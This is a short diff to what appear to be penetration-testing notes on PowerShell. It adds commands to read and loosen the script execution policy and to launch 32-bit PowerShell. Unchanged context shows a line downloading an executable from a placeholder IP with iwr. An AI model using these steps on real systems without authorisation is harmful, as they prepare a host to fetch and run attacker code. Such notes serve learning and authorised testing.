@@ -21,6 +21,14 @@ Basic Strategy
 
 ```powershell
 
+# see script exec policy
+
+Get-ExecutionPolicy -Scope CurrentUser
+
+# set to unrestricted
+
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+
 # see user's history
 Get-History
 
@@ -53,6 +61,11 @@ iwr -uri http://IP -outfile some.exe
 
 # test locally connections
 Test-NetConnection -Port 445 192.168.50.111
+
+# run x86 version of powershell from cmd.exe
+
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+
 ```
 
 ### Helpful stuff
